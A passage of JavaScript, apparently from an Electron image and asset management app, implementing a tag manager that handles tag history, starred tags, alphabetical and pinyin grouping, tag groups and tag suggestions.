                    showSearch = true;
                }

                ContextMenu.open({
                    width: 200,
                    items: items,
                    persistents: persistents,
                    showSearch: items.length > 0,
                    sortable: true,
                    sortableHelper: false,
                    onSorted: (items) => {
                        if (!items) return;

                        const newFilters = $scope.SavedFilter.filters.sort((a, b) => {
                            try {
                                let itemA = filterItemMap.get(a);
                                let itemB = filterItemMap.get(b);
                                let idxA = items.indexOf(itemA);
                                let idxB = items.indexOf(itemB);
                                return idxA - idxB;
                            }
                            catch (err) {
                                return 0;
                            }
                        });

                        if (newFilters.length === $scope.SavedFilter.filters.length) {
                            $scope.SavedFilter.filters = newFilters;
                        }

                        $scope.SavedFilter.save();
                    }
                })
            },
            apply: function (filter) {
                eagle.filter.filterRules = $.extend(true, {}, eagle.filter.defaultRules, filter);
                if (filter.keyword) {
                    $scope.keyword = filter.keyword;
                    $scope.$broadcast("Reset_Filter");
                    $scope.search($scope.keyword);
                }
                else {
                    $scope.$broadcast("Reset_Filter");
                    $scope.rebindRefresh();
                }
            }
        }

        // 标签管理器
        var TagManager = {
            rawdata: [],            // 純粹的標籤內容
            tagMappings: {},       //  使用標籤獲得物件
            historyTags: [],       // 历史标签
            starredTags: [],       // 常用标签
            jsonPath: "",
            suggestions: [],
            allTags: [],
            unfiledTags: [],
            filedTags: [],
            azGroups: [],
            groups: [],             // 群组列表
            groupMappings: {},      // 群组列表 Mappings
            sortBy: localStorage['TAGS_SORT_BY'] || "name",
            groupBy: localStorage['TAGS_GROUP_BY'] || "alphabet",
            sortIncrease: localStorage['TAGS_SORT_INCREASE'] || 'true' 
        };

        // 初始化
        TagManager.init = function (rootDir) {
            try {
                var jsonPath = path.normalize(rootDir + "/tags.json");

                // 从 jsonPath 取出资料
                if (!fs.existsSync(jsonPath)) {

                    writeFileAtomic(jsonPath, JSON.stringify({
                        historyTags: [],
                        starredTags: []
                    }), function () {
                        var json = fs.readFileSync(jsonPath, 'utf8');
                        var data = JSON.parse(json);

                        TagManager.jsonPath = jsonPath;
                        TagManager.historyTags = data.historyTags || [];
                        TagManager.starredTags = data.starredTags || [];
                    });
                }
                else {

                    var json = fs.readFileSync(jsonPath, 'utf8');
                    var data = JSON.parse(json);

                    TagManager.jsonPath = jsonPath;
                    TagManager.historyTags = data.historyTags || [];
                    TagManager.starredTags = data.starredTags || [];
                }
            }
            catch (err) {
                TagManager.jsonPath = jsonPath;
                TagManager.historyTags = [];
                TagManager.starredTags = [];
                electronLog && electronLog.error(err.stack || err);
            }
        };

        // 储存（五秒最多更新一次）
        var TagManagerSaveTimeout;
        TagManager.save = function () {

            clearTimeout(TagManagerSaveTimeout);

            TagManagerSaveTimeout = setTimeout(function () {

                var json = {
                    historyTags: TagManager.historyTags,
                    starredTags: TagManager.starredTags
                };

                writeFileAtomic(TagManager.jsonPath, JSON.stringify(json), function (err) {});

            }, 5000);

        };

        TagManager.changeGroupBy = function (groupBy) {
            TagManager.groupBy = groupBy;
            if (TagManager.groupBy === "alphabet") {
                TagManager.currentGroups = TagManager.azGroups;    
            }
            else {
                TagManager.currentGroups = TagManager.allGroups;
            }
            TagManager.renderTagsResult();
            localStorage['TAGS_GROUP_BY'] = groupBy;
        };

        // 搜尋、resize、切換 sidebar 時重新計算列表、調整佈局
        TagManager.renderTagsResult = () => {

            const sortTags = (tags) => {

                function sortByAZ(arr) {
                    var collator = new Intl.Collator(languageBCP || "en", { numeric: true, sensitivity: 'base' });
                    return arr.sort(function (a, b) {
                        return collator.compare(a.name, b.name);
                    });
                }
            
                function sortByCount(arr) {
                    var collator = new Intl.Collator(languageBCP || "en", { numeric: true, sensitivity: 'base' });
                    return arr.sort(function (a, b) {
                        // 先按數量排序
                        if (a.imageCount < b.imageCount) {
                            return 1;
                        }
                        if (a.imageCount > b.imageCount) {
                            return -1;
                        }
            
                        // 如果數量相同，再按名字排序
                        return collator.compare(a.name, b.name);
                    });
                }

                try {
                    let tagObjects = tags.map(function (tag) {
                        return TagManager.tagMappings[tag];
                    });
                    if (TagManager.sortBy === "name") {
                        tagObjects = sortByAZ(tagObjects);
                    }
                    else {
                        tagObjects = sortByCount(tagObjects);
                    }
                    if (TagManager.sortIncrease === "false") {
                        tagObjects = tagObjects.reverse();
                    }
                    return tagObjects.map(function (tagObject) {
                        return tagObject.name;
                    });
                } catch (err) {
                    return tags;
                }
            };

            const getTagData = () => {

                let groups = ($scope.currentTagGroup)? [$scope.currentTagGroup] : $scope.TagManager.currentGroups || [];
                let tags = [];
                const tagsMap = {};

                switch ($scope.tagViewMode) {
                    case "ALL":
                        tags = $scope.TagManager.tagNames || [];
                        break;
                    case "UNFILED":
                        tags = $scope.TagManager.unfiledTags || [];
                        break;
                    case "STARRED":
                        tags = $scope.TagManager.starredTags;
                        groups = [{
                            id: "starred",
                            name: i18n.__("pages.allTags.sidebar.starred"),
                            tags: $scope.TagManager.starredTags
                        }];
                        break;
                    case "GROUP":
                        tags = $scope.currentTagGroup.tags || [];
                        break;
                }

                const keyword = $scope?.keyword?.toLowerCase();
                tags = tags.filter((tagName) => {
                    if (!keyword) return true;
                    if (typeof tagName !== "string") return false;

                    const tag = TagManager.tagMappings[tagName];
                    const name = tagName.toLowerCase();
                    const pinyin = tag.pinyin.toLowerCase();

                    return name.indexOf(keyword) > -1 || pinyin.indexOf(keyword) > -1;
                });

                tags.forEach((tag) => {
                    tagsMap[tag] = true;
                });

                return {
                    tags: tags,
                    tagsMap: tagsMap,
                    groups: groups
                }
            };

            const generateDisplayData = ({ tags, tagsMap, groups }) => {
                const listItems = [];
                let displayGroups = [];

                let filteredGroups;
                
                // 如果是群組列表，無論有無標籤都應顯示
                if ($scope.tagViewMode === "GROUP" || $scope.tagViewMode === "STARRED") {
                    filteredGroups = groups;
                }
                else {
                    filteredGroups = groups.filter((group) => {
                        const tags = group.tags.filter((tag) => {
                            return tagsMap[tag];
                        });
                        return (tags.length > 0);
                    });
                }
                const containerWidth = $(".tag-manager-container").width();
                const n = ($scope.tagViewLayoutMode === "LIST")? 0 : Math.max(0, parseInt((containerWidth - 32) / 200) - 1);
                const columnCount = parseInt(containerWidth / 200);
                const columnWidth = parseInt(containerWidth / columnCount);

                let currentY = 0;
                filteredGroups.forEach((group, index) => {

                    let tags = group.tags.filter((tag) => {
                        return tagsMap[tag];
                    });

                    tags = sortTags(tags);

                    let groupType = (group.id === 'starred')? "starred" : "group";  
                    listItems.push({
                        type: groupType,
                        name: group.name,
                        size: 32,
                        count: tags.length,
                        y: currentY,
                    });
                    currentY += 32;

                    let row = [];

                    tags.forEach((tag, index) => {
                        row.push(tag);
                        if ((index + 1) % (n + 1) === 0) {
                            listItems.push({
                                size: 27,
                                type: "row",
                                tags: [...row],
                                y: currentY
                            });
                            row = [];
                            currentY += 27;
                        }
                    });

                    if (row.length > 0) {
                        listItems.push({
                            size: 27,
                            type: "row",
                            tags: [...row],
                            y: currentY
                        });
                        currentY += 27;
                        row = [];
                    }

                    if (index !== filteredGroups.length - 1 && filteredGroups.length > 1) {
                        listItems.push({
                            size: 25,
                            type: "separator",
                            y: currentY
                        });
                        currentY += 25;
                    }
                });

                return {
                    columnWidth: columnWidth,
                    listItems: listItems
                }
            };

            const { tags, tagsMap, groups } = getTagData();
            const { columnWidth, listItems } = generateDisplayData({ tags, tagsMap, groups });
            TagManager.tagsResult = {
                tags,
                display: listItems,
                columnWidth: columnWidth
            };
        };

        TagManager.changeSort = function (sortBy, sortIncrease) {
            TagManager.sortBy = sortBy;
            TagManager.sortIncrease = sortIncrease;
            localStorage['TAGS_SORT_BY'] = sortBy;
            localStorage['TAGS_SORT_INCREASE'] = sortIncrease;
            TagManager.calculateTags();
            TagManager.renderTagsResult();
        };

        TagManager.saveGroup = function () {
            $scope.saveFolder();
        };

        TagManager.isSelected = function (tag) {
            if (eagle.inspector.newTags) {
                var selectedTags = eagle.inspector.newTags;
                var idx = selectedTags.indexOf(tag);
                return idx > -1;
            }
            return false;
        };

        TagManager.createTag = function createTag (tagString) {
            const tags = tagString.split(/[，,;、\n]+/);
            tags.forEach(function (t) {
                if (t && t.trim().length > 0) {
                    TagManager.addTag(t);
                }
            });
            TagManager.tagSearchKeyword = "";
            TagManager.focusTag(100);
        };

        TagManager.toggleTag = function toggleTag (event, tag) {

			var selectedTags = eagle.inspector.calculateTags($scope.selected);
			var idx = selectedTags.indexOf(tag);
			if (idx === -1) {
				var tags = tag.split(/[，,;、]+/);
				tags.forEach(function (t) {
					if (t && t.trim().length > 0) {
						TagManager.addTag(t);
					}
				});
				// TagManager.addTag(tag);
				if (event.metaKey || event.ctrlKey) {}
				else {
					TagManager.tagSearchKeyword = "";
				}
				TagManager.focusTag(100);
			}
			else {
				TagManager.removeTag(tag);
				$scope.$evalAsync();
			}

            if (!TagManager.historyTags) TagManager.historyTags = [];
            if ($scope.availableHistoryTags.indexOf(tag) === -1) {
                $scope.availableHistoryTags.unshift(tag);
            }
        };

        TagManager.addTags = function addTags (tags) {
            if (!tags || tags.length === 0) return;
            if ($scope.selected.length === 0) return;

            let changedItems = [];

            tags.forEach((tag) => {
                tag = tag.trim();
                tag = tag.substr(0, 1024);
                $scope.selected.forEach(function (item) {
                    const idx = item.tags.indexOf(tag);
                    if (idx === -1) {
                        item.tags.push(tag);
                        item.tags = [...new Set(item.tags)];
                        changedItems.push(item);
                    }
                });

                if (!TagManager.tagMappings[tag] || !TagManager.tagMappings[tag].imageCount) {
                    var newTag = {
                        name: tag,
                        pinyin: tinyPinyin.convertToPinyin(tag),
                        imageCount: 1
                    };
                    TagManager.tagMappings[tag] = newTag;
                }
                else {
                    TagManager.tagMappings[tag].imageCount++;
                }
                TagManager.addHistoryTag(tag);
                analytics.event('Tag', 'Create', tag);
            });

            changedItems = [...new Set(changedItems)];
            
            $scope.TagManager.isDirty = true;
            $scope.calcuteContainTags($scope.filtereds);
            $scope.updateSelection();
            $scope.updateItemsView($scope.selected);

            ayncsImagesChange(changedItems);
            hiddenByCurrentFilter(changedItems);
            electronLog.info(`[app] Add ${tags.length} tags to ${changedItems.length} files`);
        };

        TagManager.addTag = function addTag (tag) {
            if (tag === undefined || tag === "" ) return;

            let changedItems = [];
            if ($scope.selected.length > 0) {
                var tag = tag.trim();
                tag = tag.substr(0, 1024);
                $scope.selected.forEach(function (image) {
                    var idx = image.tags.indexOf(tag);
                    if (idx === -1) {
                        image.tags.push(tag);
                        image.tags = [...new Set(image.tags)];
                        changedItems.push(image);
                    }
                });
            }
            $scope.tagsSuggestion.push({
                value: tag,
                text: tag
            });
            
            if (!TagManager.tagMappings[tag] || !TagManager.tagMappings[tag].imageCount) {
                var newTag = {
                    name: tag,
                    pinyin: tinyPinyin.convertToPinyin(tag),
                    imageCount: 1
                };
                TagManager.tagMappings[tag] = newTag;
                // $scope.TagManager.isDirty = true;
            }
            else {
                TagManager.tagMappings[tag].imageCount++;
            }
            $scope.TagManager.isDirty = true;

            $scope.calcuteContainTags($scope.filtereds);
            TagManager.addHistoryTag(tag);
            $scope.updateSelection();

            $scope.updateItemsView($scope.selected);

            ayncsImagesChange(changedItems);
            hiddenByCurrentFilter(changedItems);
            electronLog.info(`[app] Add tag [${tag}] to ${changedItems.length} files`);
            analytics.event('Tag', 'Create', tag);
        };

        TagManager.removeTag = function (tag) {

            let changedItems = [];
            if ($scope.selected.length > 0) {
                $scope.selected.forEach(function (image) {
                    var idx = image.tags.indexOf(tag);
                    if (idx > -1) {
                        image.tags.splice(idx, 1);
                        changedItems.push(image);
                        if (TagManager.tagMappings[tag] && TagManager.tagMappings[tag].imageCount) {
                            TagManager.tagMappings[tag].imageCount--;
                            if (TagManager.tagMappings[tag].imageCount === 0) {
                            	$scope.TagManager.isDirty = true;
                                delete TagManager.tagMappings[tag];
                                let historyIdx = TagManager.historyTags.indexOf(tag);
					           	if (historyIdx > -1) {
					           		TagManager.historyTags.splice(historyIdx, 1);
					           	}
                                if ($scope.tagsSuggestionResult) {
    					           	let suggestionIdx = $scope.tagsSuggestionResult.indexOf(tag);
    					           	if (suggestionIdx > -1) {
    					           		$scope.tagsSuggestionResult.splice(suggestionIdx, 1);
    					           	}
                                }
                            }
                        }
                    }
                    // NOTE: beta 4.0 產生的 bug，導致 tags 裡面會出現 [] 的問題，因此在這裡做清理
                    // "" or is array
                    if (tag === "" || Array.isArray(tag)) {
                        // 檢查所有選中的圖片，如果有非 string 的 tag，就清除
                        image.tags = image.tags.filter((t) => {
                            return typeof t === "string";
                        });
                        changedItems.push(image);
                    }
                });
            }

			$scope.calcuteContainTags($scope.filtereds);
			$scope.updateSelection();
			$scope.updateItemsView($scope.selected);

            ayncsImagesChange(changedItems);
            hiddenByCurrentFilter(changedItems);
            $("#tag-search-input").focus();
            $scope.calculateImageBinding({ignoreSort : true}, () => {});
            electronLog.info(`[app] Remove tag [${tag}] from ${changedItems.length} files`);
        };

        // 取得历史标签
        TagManager.getHistoryTags = function () {
            return TagManager.historyTags;
        };

        TagManager.clearHistoryTags = function () {
            swal({
                html: `
                    <div class="alert">
                        <div class="alert-icon warning"></div>
                        <h4 class="alert-title">${i18n.__("Dialog.Clear.TagsHistory.Title")}</h4>
                        <p class="alert-desc">${i18n.__("Dialog.Clear.TagsHistory.Description")}</p>
                    </div>
                `,
                showCloseButton: false, showCancelButton: true, allowOutsideClick: false, focusConfirm: true, focusCancel: false, padding: 24,
                width: 400,
                customClass: "alert-box",
                cancelButtonColor: "#777777",
                confirmButtonText: i18n.__("Dialog.Clear.TagsHistory.Clear"),
                cancelButtonText: i18n.__("general.cancel"),
            }).then(function () {
                electronLog.info(`[app] Empty history tags: ${JSON.stringify(TagManager.historyTags)}`);
                TagManager.historyTags = [];
                $scope.availableHistoryTags = [];
                $scope.$evalAsync();
                TagManager.save();
            });
        };

        // 添加历史标签
        TagManager.addHistoryTag = function (tag) {
            if (!tag) return;
            // if (!TagManager.tagMappings[tag]) return;
            var idx = TagManager.historyTags.indexOf(tag);
            if (idx > -1) {
                TagManager.historyTags.splice(idx, 1);
            }
            TagManager.historyTags.unshift(tag);
            if (TagManager.historyTags.length > 120) {
                TagManager.historyTags.length = 120;
            }
            TagManager.save();
        };

        TagManager.addHistoryTags = function (tags) {
            if (tags?.length === 0) return;
            tags = tags.reverse();
            tags.forEach(function (tag) {
                if (!tag) return;
                TagManager.addHistoryTag(tag);
            });
        };

        TagManager.isInHistory = function (tag) {
            if (TagManager.historyTags) {
                var sub = TagManager.historyTags.slice(0, 15);
                return sub.indexOf(tag) > -1;
            }
            else {
                return false;
            }
        };

        // 取得常用标签
        TagManager.getStarredTags = function () {
            return TagManager.starredTags;
        };

        // 添加常用标签
        TagManager.addStarredTag = function (tag) {
            var idx = TagManager.starredTags.indexOf(tag);
            if (idx > -1) {
                TagManager.starredTags.splice(idx, 1);
            }
            TagManager.starredTags.unshift(tag);
            TagManager.calculateTags();
            TagManager.renderTagsResult();
            TagManager.save();
            try {
                electronLog.info(`[app] Add tag [${tag}] to favorite tags`);
            } catch (err) {};
        };

        // 添加常用标签
        TagManager.addStarredTags = function (tags) {
            if (tags?.length === 0) return;
            tags = tags.reverse();
            tags.forEach(function (tag) {
                var name = tag.name || tag;
                if (!name) return;
                var idx = TagManager.starredTags.indexOf(name);
                if (idx > -1) {
                    TagManager.starredTags.splice(idx, 1);
                }
                TagManager.starredTags.unshift(name);
            });
            TagManager.calculateTags();
            TagManager.renderTagsResult();
            TagManager.save();
            try {
                electronLog.info(`[app] Add tag ${JSON.stringify(tags)} to favorite tags`);
            } catch (err) {};
        };

        // 移除常用标签
        TagManager.removeStarredTag = function (tag) {
            var idx = TagManager.starredTags.indexOf(tag);
            if (idx > -1) {
                TagManager.starredTags.splice(idx, 1);
                TagManager.save();
                try {
                    electronLog.info(`[app] Remove tag [${tag}] from favorite tags`);
                } catch (err) {};
            }
            TagManager.renderTagsResult();
        };

        // 移除常用标签
        TagManager.removeStarredTags = function (tags) {
            if (tags?.length === 0) return;
            tags.forEach(function (tag) {
                var idx = TagManager.starredTags.indexOf(tag);
                if (idx > -1) {
                    TagManager.starredTags.splice(idx, 1);
                }
            });
            TagManager.save();
            TagManager.renderTagsResult();
            try {
                electronLog.info(`[app] Remove tag ${JSON.stringify(tags)} from favorite tags`);
            } catch (err) {};
        };

        TagManager.isInStarred = function (tag) {
            return TagManager.starredTags.indexOf(tag) > -1;
        };

        TagManager.isAllInStarred = function (tags) {
            for (var i = 0; i < tags.length; i++) {
                if (!TagManager.isInStarred(tags[i].name)) {
                    return false;
                }
            }
            return true;
        };

        // 取得所有标签
        TagManager.getTags = function () {
            return $scope.tags;
        };

        // 取得文件夹包含标签
        TagManager.getFolderTags = function (folderIds) {

            var result = [];

            folderIds.forEach(function (folderId) {
                var images = $scope.raw.filter(function (image) {
                    try {
                        if (image && image.folders) {
                            return image.folders && image.folders.indexOf(folderId) > -1;
                        }
                    }
                    catch (err) {}
                    return false;
                });
                var total = images.length;
                var folderTags = calcuteContainTags(images).containTags || [];
                folderTags.forEach(function (tag) {
                    tag.ratio = tag.imageCount / total;
                    result.push(tag);
                });
            })

            return TagManager.sortTagsByRatio(result);
        };

        // 用 tags 算相似 tags
        TagManager.getSimilarTags = function (tags) {

            if (tags.indexOf("Screenshot") > -1) {
                tags.splice(tags.indexOf("Screenshot"), 1);
            }

            var images = $scope.raw.filter(function (image) {
                var match = 0;
                for (var i = 0; i < tags.length; i++) {
                    if (image && image.tags) {
                        if (image.tags.indexOf(tags[i]) > -1) {
                            match++;
                        }
                    }
                }
                return match == tags.length;
            });
            var total = images.length - 1;
            var result = calcuteContainTags(images).containTags;
            result = result.filter(function (tag) {
                for (var i = 0; i < tags.length; i++) {
                    if (tags[i] === tag.name) {
                        return false;
                    }
                }
                tag.ratio = tag.imageCount / total;
                return true;
            });
            return TagManager.sortTagsByRatio(result);
        };

        // 使用標籤占比排序
        TagManager.sortTagsByRatio = function (tags) {
            return tags.sort(function (tag) {
                return -tag.ratio;
            });
        };

        // 排除
        TagManager.excludeExistTags = function (exists, tags) {
            if (!exists || exists.length == 0) return tags;
            var result = tags.filter(function (tag) {
                if (exists.indexOf(tag.name || tag) > -1) return false;
                return true;
            });
            return result;
        };

        TagManager.print = function (tags) {
            var result = [];
            tags.forEach(function (tag) {
                if (tag.ratio > 0.2) {
                    result.push({
                        "建議標籤": tag.name,
                        "比例": parseFloat(Math.round(tag.ratio * 100 * 100) / 100).toFixed(2) + "%"
                    });
                }
            });
            if (result.length > 0) {
                // console.table(result);
            }
        };

        TagManager.focusTag = function (delay) {
            setTimeout(function () {
                var $active = $("#tags-popup .tag.active");
                if ($active.length == 0) {
                    $("#tags-popup .tag").first().addClass("active");
                }
            }, delay || 500);
        };

        // 使用断词方式计算标签 （最后再处理）
        TagManager.getJiebaTags = function (string) {

        };

        // 永久移除标签
        TagManager.removeTagsPermanently = function (tags) {

            var changed = [];
            var selectedTags = {};

            tags.forEach(function (tag) {
                selectedTags[tag] = true;
            })

            for (var rindex = $scope.raw.length - 1; rindex >= 0; rindex--) {
                var image = $scope.raw[rindex];
                var originTagCount = image.tags.length;
                image.tags = image.tags.filter(function (tag) {
                    return !selectedTags[tag];
                });
                if (image.tags && image.tags.length != originTagCount) {
                    changed.push(image);
                }
            }

            if (changed.length > 0) {
                ayncsImagesChange(changed);
                hiddenByCurrentFilter(changed);
            }
        };

        // 取得推荐标签
        TagManager.getSuggestTags = function (images) {

            if (!images) return [];

            // 大批辆图片不进行推荐
            if (images.length > 500) return;
            // console.time("======== 取得推荐标签 ========");
            var result = [];
            var folderIdsMap = {};
            var tagsMap = {};
            var nameString = "";

            if (images[0] && images.length == 1) {
                nameString = images[0].name;
            }

            images.forEach(function (image) {
                if (!image) return;
                if (image.folders) {
                    image.folders.forEach(function (folderId) {
                        folderIdsMap[folderId] = true;
                        var folder = $scope.folderMappings[folderId];
                        if (folder && folder.name) {
                            var ancestors = getAncestorFolders(folder, []);
                            if (ancestors && ancestors.length > 0) {
                                ancestors.forEach(function (ancestor) {
                                    nameString += " " + ancestor.name.split(/[ ，）（(),;、\n]+/).join(" ");
                                });
                            }
                            nameString += " " + folder.name;
                        }
                    });
                }
                if (image.tags) {
                    image.tags.forEach(function (tag) {
                        tagsMap[tag] = true;
                    });
                }
                // nameString += image.name + " ";
            });

            // var folderIds = Object.keys(folderIdsMap).map(function(key) {
            //     return key;
            // });

            var tags = Object.keys(tagsMap).map(function(key) {
                return key;
            });

            // var selectedTags = calculateTags($scope.selected);

            // console.log("包含文件夹：", folderIds);
            // console.log("包含标签：", tags);

            // var folderContainTags = [];
            // if (folderIds.length > 0) {
            //     folderContainTags = TagManager.getFolderTags(folderIds);
            // }
            // // console.log("文件夾推薦算法：");
            // // TagManager.print(folderContainTags);
            // folderContainTags.forEach(function (tag) {
            //     if (TagManager.isInHistory(tag.name)) {
            //         tag.ratio += 0.15;
            //     }
            //     if (tag.ratio > 0.2) {
            //         result.push(tag.name);
            //     }
            // });

            // var imageSimilarTags = [];
            // if (tags.length > 0) {
            //     imageSimilarTags = TagManager.getSimilarTags(tags);
            // }
            // console.log("相關圖片推薦算法：");
            // TagManager.print(imageSimilarTags);
            // imageSimilarTags.forEach(function (tag) {
            //     if (TagManager.isInHistory(tag.name)) {
            //         tag.ratio += 0.15;
            //     }
            //     if (tag.ratio > 0.2) {
            //         result.push(tag.name);
            //     }
            // });

            TagManager.suggestions = result;
            TagManager.nameString = nameString;

            // console.log("歷史記錄：");
            // console.log(TagManager.historyTags);

            ipcRenderer.send('jieba-extract', nameString);
        };

        TagManager.coverToAZList = function (list) {
            var azGroups = {};
            azGroups["others"] = {
                name: "＃",
                tags: []
            };

            list.forEach(function (tag) {
                if (!tag) return;
                if (tag.name && tag.pinyin) {
                    var t = tag.name[0].toUpperCase(),
                        pint = tag.pinyin[0].toUpperCase(),
                        addToAZGroup = false;

                    // 依据首字母分类
                    if ((preferences.general.language === "ru_RU" || preferences.general.language === "en") && (/[а-яА-ЯЁё]/.test(t) || /[а-яА-ЯЁё]/.test(pint)) ) {
                        addToAZGroup = true;
                    }
                    else if (preferences.general.language === "ja_JP" && /[\u3000-\u303F]|[\u3040-\u309F]|[\u30A0-\u30FF]|[\uFF00-\uFFEF]|[\u4E00-\u9FAF]|[\u2605-\u2606]|[\u2190-\u2195]|\u203B/.test(t) ) {
                        pint = JAPANESE_CHAR_MAP[t];
                        if (!pint) {
                            addToAZGroup = false;
                        }
                        else {
                            addToAZGroup = true;
                        }
                    }
                    else if (/^([a-zA-Z _-]+)$/.test(t) || /^([a-zA-Z _-]+)$/.test(pint)) {
                        addToAZGroup = true;
                    }

                    if (addToAZGroup) {
                        if (!azGroups[pint]) {
                            azGroups[pint] = {
                                name: pint,
                                tags: []
                            };
                        }
                        azGroups[pint].tags.push(tag);
                    }
                    else {
                        azGroups["others"].tags.push(tag);
                    }
                }
            })

            var azList = Object.keys(azGroups).map(function(key) { return azGroups[key]; }).sort(function(a, b) {
                if (a.name < b.name)
                    return -1;
                if (a.name > b.name)
                    return 1;
                return 0;
            });

            return azList;

        };

        // 以下與標籤群組功能相关
        // Step 1: 建立 rawdata
        // Step 2: 建立 a-z 列表
        // Step 3: 建立 unfield 与 field 列表
        // Step 4: 建立 Group Mappings
        TagManager.calculateTags = function () {

            // console.time("TagManager.calculateTags");
            TagManager.tagMappings = {};
            TagManager.groupMappings = {};

            for (var i = 0; i < TagManager.rawdata.length; i++) {
                let tag = TagManager.rawdata[i];
                TagManager.tagMappings[tag.name] = tag;
                tag.groups = [];
                delete tag.color;

                $scope.tagsSuggestion.push({
                    value: tag.name,
                    text: tag.name
                });
            }

            TagManager.starredTags.forEach(function (tag) {
                // 没有任何图片包含的标签
                var tagObject = TagManager.tagMappings[tag];
                if (!tagObject) {
                    var newTag = {
                        name: tag,
                        pinyin: tinyPinyin.convertToPinyin(tag),
                        imageCount: 0
                    };
                    TagManager.tagMappings[tag] = newTag;
                }
            });

            // 創建 rawdata
            // 創建 groups
            // 創建 groupMappings
            TagManager.groups.forEach(function (group) {
                try {
                    var groupID = group.id;
                    delete group.editable;

                    TagManager.groupMappings[groupID] = group;

                    group.tags.forEach(function (tag) {

                        // 没有任何图片包含的标签
                        var tagObject = TagManager.tagMappings[tag];
                        if (!tagObject) {
                            var newTag = {
                                name: tag,
                                pinyin: tinyPinyin.convertToPinyin(tag),
                                imageCount: 0,
                                groups: [groupID]
                            };
                            if (group.color) {
                                newTag.color = group.color;
                            }
                            TagManager.tagMappings[tag] = newTag;
                            TagManager.rawdata.push(newTag);
                        }
                        // 将群组 id 添加到标签物件
                        else {
                            if (group.color) {
                                if (!tagObject.color) {
                                    tagObject.color = group.color;
                                }
                            }
                            else {
                                delete tagObject.color;
                            }
                            if (tagObject.groups) {
                                var idx = tagObject.groups.indexOf(groupID);
                                if (idx === -1) {
                                    tagObject.groups.push(groupID);
                                }
                            }
                        }

                    });
                }
                catch (err) {
                    console.error(err);
                }
            });

            // 创建 allTags
            TagManager.allTags = TagManager.rawdata.sort(function (tag1, tag2) {
                return tag2.imageCount - tag1.imageCount;
            });

            TagManager.tagNames = TagManager.allTags.map(function (tag) {
                return tag.name;
            });

            // 创建 unfiledTags 与 filedTags
            TagManager.filedTags = [];
            TagManager.unfiledTags = [];
            TagManager.unfiledTagsMap = {};

            for (var i = 0; i < TagManager.allTags.length; i++) {
                var tagObject = TagManager.allTags[i];
                // 已分类
                if (tagObject.groups.length > 0) {
                    TagManager.filedTags.push(tagObject);
                }
                // 未分类
                else {
                    TagManager.unfiledTags.push(tagObject.name);
                    TagManager.unfiledTagsMap[tagObject.name] = true;
                }
            }

            // 建立 AZ Group
                        // 创建 a-z 列表
            var azGroups = {};
            azGroups["others"] = {
                name: "＃",
                tags: []
            };

            TagManager.rawdata.forEach(function(tag) {

                if (!tag) return;

                $scope.tagsSuggestion.push({
                    value: tag.name,
                    text: tag.name
                });

                var tagName = tag.name;
                var tagPinyin = tag.pinyin;

                if (tagName && tagPinyin) {

                    var t = tagName[0].toUpperCase(),
                        pint = tagPinyin[0].toUpperCase(),
                        addToAZGroup = false;

                    // 依据首字母分类
                    if ((preferences.general.language === "ru_RU" || preferences.general.language === "en") && (/[а-яА-ЯЁё]/.test(t) || /[а-яА-ЯЁё]/.test(pint)) ) {
                        addToAZGroup = true;
                    }
                    else if (preferences.general.language === "ja_JP" && /[\u3000-\u303F]|[\u3040-\u309F]|[\u30A0-\u30FF]|[\uFF00-\uFFEF]|[\u4E00-\u9FAF]|[\u2605-\u2606]|[\u2190-\u2195]|\u203B/.test(t) ) {
                        pint = JAPANESE_CHAR_MAP[t];
                        if (!pint) {
                            addToAZGroup = false;
                        }
                        else {
                            addToAZGroup = true;
                        }
                    }
                    else if (/^([a-zA-Z _-]+)$/.test(t) || /^([a-zA-Z _-]+)$/.test(pint)) {
                        addToAZGroup = true;
                    }

                    if (addToAZGroup) {
                        if (!azGroups[pint]) {
                            azGroups[pint] = {
                                name: pint,
                                tags: []
                            };
                        }
                        azGroups[pint].tags.push(tag.name);
                    }
                    else {
                        azGroups["others"].tags.push(tag.name);
                    }
                }
            });

            TagManager.azGroups = Object.keys(azGroups).map(function(key) { return azGroups[key]; }).sort(function(a, b) {
                if (a.name < b.name)
                    return -1;
                if (a.name > b.name)
                    return 1;
                return 0;
            });

            TagManager.allGroups = [];
            TagManager.groups.forEach(function (group) {
                TagManager.allGroups.push(group);
            });
            TagManager.allGroups.push({
                name: i18n.__('general.pages.unfiled'),
                tags: TagManager.unfiledTags
            });

            if (!TagManager.historyTags) TagManager.historyTags = [];
            $scope.availableHistoryTags = TagManager.historyTags.filter(function (tag) {
                if (!TagManager.tagMappings[tag] || TagManager.tagMappings[tag].imageCount === 0) {
                    return false;
                }
                return true;
            });

            TagManager.changeGroupBy(TagManager.groupBy);
        };

        TagManager.createGroup = function (groupName) {
            var newGroup = {
                id: guid(),
                name: groupName || "",
                tags: []
            };
            TagManager.groups.push(newGroup);
            TagManager.calculateTags();
            TagManager.saveGroup();
            try {
                electronLog.info(`[app] New tag group: ${newGroup.id}`);
                electronLog.info(`${JSON.stringify(newGroup)}`);
                analytics.event('TagGroup', 'Create');
            } catch (err) {};
            return newGroup;
        };

        TagManager.createGroupWithTags = function (groupName, tags) {
            if (!is.array(tags)) {
                tags = [];
            }
            var newGroup = {
                id: guid(),
                name: groupName || "",
                tags: tags,
            };
            TagManager.groups.push(newGroup);
            TagManager.calculateTags();
            TagManager.saveGroup();
            try {
                electronLog.info(`[app] New tag group: ${newGroup.id}`);
                electronLog.info(`${JSON.stringify(newGroup)}`);
                analytics.event('TagGroup', 'Create');
            } catch (err) {};
            return newGroup;
        };

        TagManager.renameGroup = function (groupID, newName) {
            var group = TagManager.groupMappings[groupID];
            newName = newName.substr(0, 1024);
            if (group && group.name != newName) {
                try {
                    electronLog.info(`[app] Rename tag group: ${group.id} ${group.name} > ${newName}`);
                    analytics.event('TagGroup', 'Rename', newName);
                } catch (err) {};
                group.name = newName;
                TagManager.saveGroup();
            }
        };

        TagManager.removeGroup = function (groupID, isRemoveTags) {

            var group = TagManager.groupMappings[groupID];
            if (!group) return;

            var idx = TagManager.groups.indexOf(group);
            if (idx > -1) {
                TagManager.groups.splice(idx, 1);

                // 是否要一併移除所有包含該標籤圖片的標籤
                // 如果移除图片标签，那就需要重新计算整体关系
                if (isRemoveTags) {
                    TagManager.removeTagsPermanently(group.tags);
                    $scope.calculateImageBinding({ ignoreSort: true });
                    try {
                        electronLog.info(`[app] Remove tag group(${group.id}) also remove includes tags`);
                    } catch (err) {};
                }
                else {
                    TagManager.calculateTags();
                    try {
                        electronLog.info(`[app] Remove tag group(${group.id}) exclude contains tags`);
                    } catch (err) {};
                }
                TagManager.saveGroup();
            }
            return idx;
        };

